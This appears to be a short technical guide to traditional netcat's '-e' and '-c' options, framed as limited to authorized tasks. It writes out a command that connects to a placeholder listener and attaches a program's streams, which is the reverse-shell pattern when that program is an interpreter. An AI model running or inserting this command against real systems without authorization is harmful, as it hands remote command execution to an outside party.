# Traditional netcat executable attachment

Use this branch only for an explicitly authorized process/stream task with a trusted executable. Confirm the installed **traditional** netcat build actually supports `-e`; some builds omit it. Nmap Ncat has its own options, and OpenBSD's `-e`, where present, is a TLS peer-name check rather than executable attachment. An unsupported flag is an implementation mismatch, not a failed network route.

Define `peer_ip` as the owned numeric listener address, `port` as its selected TCP port and `program` as the reviewed absolute executable. Traditional netcat can connect that program's standard streams after connecting:

~~~bash
nc -n -v "$peer_ip" "$port" -e "$program"
~~~

This executes the program with the caller's available identity; it does not grant a new identity or authenticate the TCP peer. An interactive interpreter would expose the caller's command authority on this stream, so select that only when it is the authorized task and preserve the process/session's lifetime. A trusted marker program is useful when only invocation/transport needs confirmation. Do not place credentials on an unprotected TCP stream or assume the stream has SSH-like peer verification.

Traditional `-e` accepts an executable filename, not a full shell command string with arguments. Its `-c` option explicitly invokes a shell command string on supporting builds, introducing a separate parsing/execution boundary. Keep data out of such source strings; normal quoted arguments do not repair deliberate shell reparsing.

Start the corresponding controlled listener before the selected process invocation. Correlate received marker/output with that specific invocation and identify the actual process identity when privilege is relevant. Receipt of a connection alone does not establish program success; missing bytes can come from buffering, stdin/EOF behavior, an executable error or a network failure. A stream's lack of terminal features does not by itself invalidate command execution. Stop the owned process/connection when the task finishes; a terminated socket is not proof that every spawned descendant ended.

Reference: [traditional netcat execute, shell and stream options](https://manpages.debian.org/bookworm/netcat-traditional/nc.1.en.html).
